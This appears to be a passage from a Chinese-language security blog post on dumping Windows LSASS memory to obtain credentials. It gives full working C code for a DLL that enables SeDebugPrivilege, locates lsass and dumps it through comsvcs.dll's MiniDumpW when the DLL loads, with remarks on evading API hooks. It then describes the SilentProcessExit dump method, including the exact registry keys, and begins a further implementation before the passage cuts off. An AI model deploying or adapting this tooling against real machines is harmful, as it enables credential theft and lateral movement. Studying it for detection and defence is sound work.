   BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-keyword">if</span> (isDumped) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[+] lsass dumped successfully!&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
+<p>当然我们直接这样写的代码肯定是会被无情的拦截的，这类API大家已经再熟悉不过了，肯定是被拦截的很严重的。</p>
+<h3 id="编写Dump-Lsass的DLL-yes"><a href="#编写Dump-Lsass的DLL-yes" class="headerlink" title="编写Dump Lsass的DLL(yes)"></a>编写Dump Lsass的DLL(yes)</h3><p>其实就是为了解决直接使用Comsvsc.dll中的<code>APIMiniDump</code>函数容易被用户模式下的API hook拦截的问题。dll编写的思路一般是</p>
+<ul>
+<li>获取Debug权限</li>
+<li>找到lsass的PID</li>
+<li>使用MiniDump或MiniDumpWriteDump进行内存dump</li>
+</ul>
+<p>首先需要解决权限提升的问题，这里常用的是RtlAdjustPrivilege函数来进行权限提升，这个函数封装在NtDll.dll中。这个函数的定义和解释:</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">NTSTATUS RtlAdjustPrivilege(<br>  ULONG               Privilege,<br>  <span class="hljs-type">BOOLEAN</span>             <span class="hljs-keyword">Enable</span>,<br>  <span class="hljs-type">BOOLEAN</span>             CurrentThread,<br>  PBOOLEAN            Enabled<br>);<br></code></pre></div></td></tr></table></figure>
+<p>函数说明：</p>
+<p>RtlAdjustPrivilege 函数用于启用或禁用当前线程或进程的特权。调用此函数需要进程或线程具有 SE_TAKE_OWNERSHIP_NAME 特权或调用者已经启用了此特权。</p>
+<p>参数说明：</p>
+<ul>
+<li>Privilege：要调整的特权的标识符。可以是一个 SE_PRIVILEGE 枚举值或一个特权名称字符串。</li>
+<li>Enable：指示是启用（TRUE）还是禁用（FALSE）特权。</li>
+<li>CurrentThread：指示要调整特权的是当前线程（TRUE）还是当前进程（FALSE）。</li>
+<li>Enabled：输出参数，返回调整特权操作的结果。如果特权成功启用或禁用，则返回 TRUE；否则返回 FALSE。</li>
+</ul>
+<p>返回值：</p>
+<ul>
+<li>如果函数成功执行，则返回 STATUS_SUCCESS；否则返回错误代码。</li>
+</ul>
+<p>需要注意的是，该函数并不是公开的 Win32 API 函数，而是 Windows 内核函数，只能从其他内核函数中调用。</p>
+<p>我们首先调用 OpenProcessToken 函数打开当前进程的访问令牌。然后，使用 LookupPrivilegeValue 函数获取 SE_DEBUG_NAME 权限的本地权限 ID。接着，我们定义了一个 TOKEN_PRIVILEGES 结构体，将 SE_DEBUG_NAME 权限添加到该结构体中，并通过 AdjustTokenPrivileges 函数提升当前进程的权限。最后，我们关闭了访问令牌句柄并退出程序。<br>所以提升权限可以这样写</p>
+<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getPrivilege</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	HANDLE hToken;<br>	TOKEN_PRIVILEGES tkp;<br><br>	<span class="hljs-comment">// 打开当前进程的访问令牌</span><br>	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">OpenProcessToken</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))<br>	&#123;<br>		<span class="hljs-comment">// 获取 SeDebugPrivilege 权限的本地权限 ID</span><br>		<span class="hljs-keyword">if</span> (<span class="hljs-built_in">LookupPrivilegeValue</span>(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;tkp.Privileges[<span class="hljs-number">0</span>].Luid))<br>		&#123;<br>			tkp.PrivilegeCount = <span class="hljs-number">1</span>;<br>			tkp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>			<span class="hljs-comment">// 提升当前进程的 SeDebugPrivilege 权限</span><br>			<span class="hljs-keyword">if</span> (<span class="hljs-built_in">AdjustTokenPrivileges</span>(hToken, FALSE, &amp;tkp, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>			&#123;<br>				std::cout &lt;&lt; <span class="hljs-string">&quot;Token privileges adjusted successfully&quot;</span> &lt;&lt; std::endl;<br><br>				<span class="hljs-comment">// 关闭访问令牌句柄</span><br>				<span class="hljs-built_in">CloseHandle</span>(hToken);<br>			&#125;<br>			<span class="hljs-keyword">else</span> &#123;<br>				std::cout &lt;&lt; <span class="hljs-string">&quot;AdjustTokenPrivileges faile&quot;</span> &lt;&lt; std:endl;<br>			&#125;<br>		&#125;<br>		<span class="hljs-keyword">else</span> &#123;<br>			std::cout &lt;&lt; <span class="hljs-string">&quot;LookupPrivilegeValue faile&quot;</span> &lt;&lt; std::endl;<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">else</span> &#123;<br>		std::cout &lt;&lt; <span class="hljs-string">&quot;OpenProcessToken faile&quot;</span> &lt;&lt; std::endl;<br>	&#125;<br><br><br>&#125;<br><br></code></pre></div></td></tr></table></figure>
+<p>再配合上获取lsass进程pid和dump 进程后完整代码就是</p>
+<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">HRESULT</span><span class="hljs-params">(WINAPI* _MiniDumpW)</span><span class="hljs-params">(DWORD arg1, DWORD arg2, PWCHAR cmdline)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">GetLsassPid</span><span class="hljs-params">()</span> </span>&#123;<br><br>	PROCESSENTRY32 entry;<br>	entry.dwSize = <span class="hljs-keyword">sizeof</span>(PROCESSENTRY32);<br><br>	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-literal">NULL</span>);<br><br>	<span class="hljs-keyword">if</span> (Process32First(hSnapshot, &amp;entry)) &#123;<br>		<span class="hljs-keyword">while</span> (Process32Next(hSnapshot, &amp;entry)) &#123;<br>			<span class="hljs-keyword">if</span> (wcscmp(entry.szExeFile, <span class="hljs-string">L&quot;lsass.exe&quot;</span>) == <span class="hljs-number">0</span>) &#123;<br>				<span class="hljs-keyword">return</span> entry.th32ProcessID;<br>			&#125;<br>		&#125;<br>	&#125;<br><br>	CloseHandle(hSnapshot);<br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getPrivilege</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	HANDLE hToken;<br>	TOKEN_PRIVILEGES tkp;<br><br>	<span class="hljs-comment">// 打开当前进程的访问令牌</span><br>	<span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))<br>	&#123;<br>		<span class="hljs-comment">// 获取 SeDebugPrivilege 权限的本地权限 ID</span><br>		<span class="hljs-keyword">if</span> (LookupPrivilegeValue(<span class="hljs-literal">NULL</span>, SE_DEBUG_NAME, &amp;tkp.Privileges[<span class="hljs-number">0</span>].Luid))<br>		&#123;<br>			tkp.PrivilegeCount = <span class="hljs-number">1</span>;<br>			tkp.Privileges[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>			<span class="hljs-comment">// 提升当前进程的 SeDebugPrivilege 权限</span><br>			<span class="hljs-keyword">if</span> (AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>))<br>			&#123;<br>				<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Token privileges adjusted successfully&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br><br>				<span class="hljs-comment">// 关闭访问令牌句柄</span><br>				CloseHandle(hToken);<br>			&#125;<br>			<span class="hljs-keyword">else</span> &#123;<br>				<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;AdjustTokenPrivileges faile&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>			&#125;<br>		&#125;<br>		<span class="hljs-keyword">else</span> &#123;<br>			<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;LookupPrivilegeValue faile&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;OpenProcessToken faile&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>	&#125;<br><br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">DumpLsass</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">wchar_t</span>  ws[<span class="hljs-number">100</span>];<br>	_MiniDumpW MiniDumpW;<br><br>	MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(<span class="hljs-string">L&quot;comsvcs.dll&quot;</span>), <span class="hljs-string">&quot;MiniDumpW&quot;</span>);<br>	<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;GetProcAddress MiniDumpW success&quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>	swprintf(ws, <span class="hljs-number">100</span>, <span class="hljs-string">L&quot;%u %hs&quot;</span>, GetLsassPid(), <span class="hljs-string">&quot;C:\\temp.bin full&quot;</span>);	<br><br>	getPrivilege();<br><br>	MiniDumpW(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, ws);<br>&#125;<br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span><br><span class="hljs-function"><span class="hljs-params">	DWORD  ul_reason_for_call,</span></span><br><span class="hljs-function"><span class="hljs-params">	LPVOID lpReserved</span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>	&#123;<br>	<span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>		DumpLsass();<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>	<span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>	<span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>		<span class="hljs-keyword">break</span>;<br>	&#125;<br>	<span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>	DumpLsass();<br>&#125;<br></code></pre></div></td></tr></table></figure>
+
+
+
+<h2 id="添加自定义的SSP"><a href="#添加自定义的SSP" class="headerlink" title="添加自定义的SSP"></a>添加自定义的SSP</h2><h3 id="使用MemSSP对lsass进行patch"><a href="#使用MemSSP对lsass进行patch" class="headerlink" title="使用MemSSP对lsass进行patch"></a>使用MemSSP对lsass进行patch</h3><h3 id="使用AddSecurityPackage加载SSP"><a href="#使用AddSecurityPackage加载SSP" class="headerlink" title="使用AddSecurityPackage加载SSP"></a>使用AddSecurityPackage加载SSP</h3><h3 id="rpc-ssp"><a href="#rpc-ssp" class="headerlink" title="rpc + ssp"></a>rpc + ssp</h3><p>就是我们常用的mimikatz的misc::memssp</p>
+<h3 id="SilentProcessExit进行Dump"><a href="#SilentProcessExit进行Dump" class="headerlink" title="SilentProcessExit进行Dump"></a>SilentProcessExit进行Dump</h3><blockquote>
+<p>具体原理参考文章：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/8uEr5dNaQs24KuKxu5Yi9w">利用SilentProcessExit机制dump内存</a></p>
+<p>Silent Process Exit，即静默退出。而这种调试技术，可以派生 werfault.exe进程，可以用来运行任意程序或者也可以用来转存任意进程的内存文件或弹出窗口。在某个运行中的进程崩溃时，werfault.exe将会Dump崩溃进程的内存，从这一点上看，我们是有可能可以利用该行为进行目标进程内存的Dump。</p>
+<p>优点：系统正常行为<br>缺点：需要写注册表</p>
+</blockquote>
+<p>该机制提供了在两种情况下可以触发对被监控进行进行特殊动作的能力：</p>
+<ul>
+<li><p>（1）被监控进程调用 ExitProcess() 终止自身；</p>
+</li>
+<li><p>（2）其他进程调用 TerminateProcess() 结束被监控进程。</p>
+</li>
+</ul>
+<p>也就意味着当进程调用ExitProcess() 或 TerminateProcess()的时候，可以触发对该进程的如下几个特殊的动作:</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc"><span class="hljs-bullet">- </span>启动一个监控进程<br><span class="hljs-bullet">- </span>显示一个弹窗<br><span class="hljs-bullet">- </span>创建一个Dump文件<br></code></pre></div></td></tr></table></figure>
+<p>但由于该功能默认不开启，我们需要对注册表进行操作，来开启该功能，主要的注册表项为：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">添加此子键<br>HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\S</span>ilentProcessExit<span class="hljs-symbol">\l</span>sass.exe<br>名称				 类型 	   		  数据<br>DumpType		 	REG_DWORD     完全转储目标进程内存的值为MiniDumpWithFullMemory (0x2)<br>LocalDumpFolder		REG_SZ	      (DUMP文件被存放的目录，默认为<span class="hljs-variable">%TEMP%</span><span class="hljs-symbol">\\</span>Silent Process Exit)c:<span class="hljs-symbol">\t</span>emp<br>ReportingMode（REG_DWORD）	REG_DWORD	a）LAUNCH_MONITORPROCESS (0x1) – 启动监控进程；<br>                                              b）LOCAL_DUMP (0x2) – 为导致被监控进程终止的进程和被监控进程本身 二者 创建DUMP文件；<br>                                              c）NOTIFICATION (0x4) – 显示弹窗。<br><br>添加此子键<br>HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows NT<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>mage File Execution Options<span class="hljs-symbol">\l</span>sass.exe<br>名称				类型			数据<br>GlobalFlag		REG_DWORD	  0x200<br></code></pre></div></td></tr></table></figure>
+
+
+<p><img src="https://img-blog.csdnimg.cn/img_convert/446eeffd9c7793fecf8ae48f936cc37e.png" srcset="/img/loading.gif" lazyload></p>
+<p>另外就是第二个注册表，这个主要是设置dump内存的一些细节问题，比如dump的位置、崩溃后操作的类型，这类选择的是LOCAL_DUMP，即0x2也就是为导致终止的进程和终止的进程创建一个转储文件。<br><img src="https://img-blog.csdnimg.cn/img_convert/7a7964a805de5a27caf80bf69eb3fcc0.png" srcset="/img/loading.gif" lazyload></p>
+<p>这里我们需要使用的是MiniDumpWithFullMemory对应的值是0x2。<br><img src="https://img-blog.csdnimg.cn/img_convert/b70a8602192ed1d84fd302f61896a4ac.png" srcset="/img/loading.gif" lazyload></p>
+<p>关于MiniDumpWithFullMemory，其都定义在MINIDUMP_TYPE之中，其结构体如下：</p>
+<figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm">typedef enum _MINIDUMP_TYPE &#123;<br>  <span class="hljs-type">MiniDumpNormal</span>,<br>  <span class="hljs-type">MiniDumpWithDataSegs</span>,<br>  <span class="hljs-type">MiniDumpWithFullMemory</span>,<br>  <span class="hljs-type">MiniDumpWithHandleData</span>,<br>  <span class="hljs-type">MiniDumpFilterMemory</span>,<br>  <span class="hljs-type">MiniDumpScanMemory</span>,<br>  <span class="hljs-type">MiniDumpWithUnloadedModules</span>,<br>  <span class="hljs-type">MiniDumpWithIndirectlyReferencedMemory</span>,<br>  <span class="hljs-type">MiniDumpFilterModulePaths</span>,<br>  <span class="hljs-type">MiniDumpWithProcessThreadData</span>,<br>  <span class="hljs-type">MiniDumpWithPrivateReadWriteMemory</span>,<br>  <span class="hljs-type">MiniDumpWithoutOptionalData</span>,<br>  <span class="hljs-type">MiniDumpWithFullMemoryInfo</span>,<br>  <span class="hljs-type">MiniDumpWithThreadInfo</span>,<br>  <span class="hljs-type">MiniDumpWithCodeSegs</span>,<br>  <span class="hljs-type">MiniDumpWithoutAuxiliaryState</span>,<br>  <span class="hljs-type">MiniDumpWithFullAuxiliaryState</span>,<br>  <span class="hljs-type">MiniDumpWithPrivateWriteCopyMemory</span>,<br>  <span class="hljs-type">MiniDumpIgnoreInaccessibleMemory</span>,<br>  <span class="hljs-type">MiniDumpWithTokenInformation</span>,<br>  <span class="hljs-type">MiniDumpWithModuleHeaders</span>,<br>  <span class="hljs-type">MiniDumpFilterTriage</span>,<br>  <span class="hljs-type">MiniDumpWithAvxXStateContext</span>,<br>  <span class="hljs-type">MiniDumpWithIptTrace</span>,<br>  <span class="hljs-type">MiniDumpScanInaccessiblePartialPages</span>,<br>  <span class="hljs-type">MiniDumpValidTypeFlags</span><br>&#125; <span class="hljs-type">MINIDUMP_TYPE</span>;<br><br></code></pre></div></td></tr></table></figure>
+<p>下面就是让lsass进程终止了，但是lsass.exe是系统进程，如果彻底终止就会导致系统蓝屏从而重启电脑，但是我们的目的只是为了转储lsass进程而不让电脑重启，这个时候我们就用到了RtlReportSilentProcessExit这个api，该API将与Windows错误报告服务（WerSvcGroup下的WerSvc）通信，告诉服务该进程正在执行静默退出。然后，WER服务将启动WerFault.exe，该文件将转储现有进程。值得注意的是，调用此API不会导致进程退出。其定义如下：</p>
+<figure class="highlight sqf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs sqf"><br>NTSTATUS （NTAPI * RtlReportSilentProcessExit ）（<br>        <span class="hljs-variable">_In_</span>      HANDLE      ProcessHandle，<br>        <span class="hljs-variable">_In_</span>      NTSTATUS    ExitStatus <br>       ）;<br></code></pre></div></td></tr></table></figure>
+<p>所以最终的流程就是类似如图<br><img src="https://img-blog.csdnimg.cn/img_convert/154c355820c3273a76e6609f4f9151ed.png" srcset="/img/loading.gif" lazyload></p>
+<p>作者的代码中，提供了两种方法来实现崩溃，一种是直接调用RtlReportSilentProcessExit，而另一种则是使用CreateRemoteThread()来实现，实际上就是远程在LSASS中创建线程执行<code>RtlReportSilentProcessExit</code>。</p>
+<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;tlhelp32.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;shlwapi.h&quot;</span></span><br> <br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib, <span class="hljs-meta-string">&quot;shlwapi.lib&quot;</span>)</span><br> <br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> IFEO_REG_KEY <span class="hljs-meta-string">L&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SILENT_PROCESS_EXIT_REG_KEY <span class="hljs-meta-string">L&quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LOCAL_DUMP 0x2</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> FLG_MONITOR_SILENT_PROCESS_EXIT 0x200</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> DUMP_FOLDER <span 